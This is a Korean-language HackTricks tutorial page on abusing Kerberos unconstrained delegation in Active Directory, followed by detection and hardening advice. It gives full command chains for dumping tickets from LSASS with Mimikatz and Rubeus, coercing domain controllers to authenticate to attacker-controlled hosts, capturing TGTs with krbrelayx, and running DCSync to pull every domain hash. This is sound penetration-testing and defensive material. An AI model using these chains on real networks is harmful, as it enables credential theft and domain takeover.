# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

이는 Domain Administrator가 도메인 내 모든 **Computer**에 설정할 수 있는 기능입니다. 이후 사용자가 해당 Computer에 **로그인**할 때마다 해당 사용자의 **TGT 사본**이 DC가 제공하는 **TGS 내부로 전송**되고 **LSASS의 메모리에 저장**됩니다. 따라서 해당 머신에 대한 Administrator 권한이 있다면 **티켓을 덤프하고 모든 머신에서 사용자를 impersonate**할 수 있습니다.

따라서 Domain Administrator가 "Unconstrained Delegation" 기능이 활성화된 Computer에 로그인하고, 사용자가 해당 머신에서 로컬 관리자 권한을 가지고 있다면 티켓을 덤프하여 어디서든 Domain Administrator를 impersonate할 수 있습니다(domain privesc).

이 속성을 가진 **Computer 객체**는 [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) 속성에 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>)이 포함되어 있는지 확인하여 **찾을 수 있습니다**. 다음 LDAP filter를 사용하면 되며, 이것이 powerview가 수행하는 방식입니다: ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Administrator(또는 victim user)의 ticket을 **Mimikatz** 또는 **Pass the Ticket**을 위한 **Rubeus**로 메모리에 로드합니다.\
추가 정보: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**ired.team의 Unconstrained delegation에 대한 추가 정보.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Force Authentication**

공격자가 **"Unconstrained Delegation"이 허용된 computer를 compromise**할 수 있다면, **Print server**를 **trick**하여 해당 computer에 **자동으로 login**하도록 만들고, 서버 메모리에 **TGT를 저장**하게 할 수 있습니다.\
그런 다음 공격자는 **Pass the Ticket attack을 수행하여** Print server computer account 사용자를 **impersonate**할 수 있습니다.

Print server가 특정 machine에 login하도록 만들려면 [**SpoolSample**](https://github.com/leechristensen/SpoolSample)을 사용할 수 있습니다:
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
TGT가 domain controller에서 발급된 것이라면 [**DCSync attack**](acl-persistence-abuse/index.html#dcsync)을 수행하여 DC의 모든 hash를 획득할 수 있습니다.\
[**이 attack에 대한 자세한 정보는 ired.team에서 확인할 수 있습니다.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

다음에서 **authentication을 강제하는** 다른 방법을 확인할 수 있습니다:


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

피해자가 **Kerberos**를 사용하여 사용자의 unconstrained-delegation host에 authenticate하도록 만드는 다른 coercion primitive도 사용할 수 있습니다. 최신 환경에서는 접근 가능한 RPC surface에 따라 classic PrinterBug flow를 **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** 또는 **WebClient/WebDAV** 기반 coercion으로 대체하는 경우가 많습니다.

### unconstrained delegation을 사용하는 user/service account 악용

Unconstrained delegation은 **computer object에만 제한되지 않습니다**. **user/service account**도 `TRUSTED_FOR_DELEGATION`으로 구성할 수 있습니다. 이 경우 실질적인 요구 사항은 해당 account가 자신이 소유한 **SPN**에 대한 Kerberos service ticket을 받아야 한다는 것입니다.

이는 매우 일반적인 2가지 offensive path로 이어집니다:

1. unconstrained-delegation **user account**의 password/hash를 compromise한 다음, 동일한 account에 **SPN**을 **add**합니다.
2. account에 이미 하나 이상의 SPN이 있지만, 그중 하나가 **stale/decommissioned hostname**을 가리키는 경우, 누락된 **DNS A record**를 재생성하는 것만으로 SPN set을 수정하지 않고 authentication flow를 hijack할 수 있습니다.<sup>[[8]](#references)</sup>

최소한의 Linux flow:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
참고:

- 이는 unconstrained principal이 **service account**이고, 조인된 호스트에서 code execution 권한은 없으며 해당 계정의 credentials만 보유한 경우 특히 유용합니다.
- 대상 사용자가 이미 **stale SPN**을 보유하고 있다면, AD에 새 SPN을 기록하는 것보다 해당 **DNS record**를 다시 생성하는 편이 덜 시끄러울 수 있습니다.
- 최근 Linux 중심의 tradecraft에서는 `addspn.py`, `dnstool.py`, `krbrelayx.py`와 하나의 coercion primitive를 사용합니다. 이 체인을 완료하기 위해 Windows 호스트를 건드릴 필요는 없습니다.

### 공격자가 생성한 computer를 이용한 Unconstrained Delegation 악용

Modern domain에서는 종종 `MachineAccountQuota > 0`입니다(기본값 10). 따라서 인증된 principal은 누구나 최대 N개의 computer object를 생성할 수 있습니다. 또한 `SeEnableDelegationPrivilege` token privilege(또는 이에 상응하는 권한)를 보유하고 있다면, 새로 생성한 computer가 unconstrained delegation을 신뢰하도록 설정하고 privileged system에서 들어오는 TGT를 수집할 수 있습니다.<sup>[[1]](#references)</sup>

High-level flow:

1) 자신이 제어하는 computer를 생성합니다
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) 도메인 내부에서 fake hostname을 resolve할 수 있도록 설정
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) 공격자가 제어하는 컴퓨터에서 Unconstrained Delegation 활성화
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
작동 원리: unconstrained delegation을 사용하면 delegation이 활성화된 컴퓨터의 LSA가 인바운드 TGT를 캐시합니다. DC 또는 권한이 높은 서버가 fake host에 인증하도록 유도하면 해당 컴퓨터의 TGT가 저장되며, 이를 export할 수 있습니다.

4) krbrelayx를 export mode로 시작하고 Kerberos 자료를 준비합니다
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) DC/서버가 가짜 host에 authentication하도록 강제
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx는 머신이 인증할 때 ccache 파일을 저장합니다. 예를 들어:
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) 캡처한 DC 머신 TGT를 사용하여 DCSync 수행
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
주의 사항 및 요구 사항:

- `MachineAccountQuota > 0`이면 권한이 없는 사용자가 computer를 생성할 수 있으며, 그렇지 않으면 명시적인 권한이 필요합니다.
- computer에 `TRUSTED_FOR_DELEGATION`을 설정하려면 `SeEnableDelegationPrivilege` 또는 domain admin 권한이 필요합니다.
- fake host로의 name resolution이 가능하도록 하십시오(DNS A 레코드). 그래야 DC가 FQDN을 통해 해당 host에 연결할 수 있습니다.
- Coercion에는 사용 가능한 vector가 필요합니다(PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN 등). 가능한 경우 DC에서 이러한 기능을 비활성화하십시오.
- 피해자 account에 **"Account is sensitive and cannot be delegated"**가 설정되어 있거나 **Protected Users**의 member인 경우, forwarded TGT가 service ticket에 포함되지 않으므로 이 chain으로 재사용 가능한 TGT를 얻을 수 없습니다.<sup>[[9]](#references)</sup>
- 인증하는 client/server에서 **Credential Guard**가 활성화되어 있으면 Windows가 **Kerberos unconstrained delegation**을 차단합니다. 따라서 operator 관점에서 정상적으로 유효한 coercion path도 실패할 수 있습니다.

Detection 및 hardening 아이디어:

- computer account가 생성될 때(Event ID 4741), 그리고 UAC `TRUSTED_FOR_DELEGATION`이 설정된 상태로 computer/user account가 변경될 때(4742/4738) alert를 생성합니다.
- domain zone에서 비정상적인 DNS A-record 추가를 monitor합니다.
- 예상하지 못한 host에서 발생하는 4768/4769 및 DC에서 non-DC host로 수행되는 authentication의 급증을 감시합니다.
- `SeEnableDelegationPrivilege`를 최소한의 set으로 제한하고, 가능한 경우 `MachineAccountQuota=0`으로 설정하며, DC에서 Print Spooler를 비활성화합니다. LDAP signing 및 channel binding을 강제합니다.

### Mitigation

- DA/Admin login을 특정 service로 제한합니다.
- privileged account에 "Account is sensitive and cannot be delegated"를 설정합니다.

## References

- [1] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – Domain compromise via unrestricted delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (CME fork)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Unconstrained Delegation in Active Directory](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – Domain compromise via DC print server and Kerberos delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

{{#include ../../banners/hacktricks-training.md}}
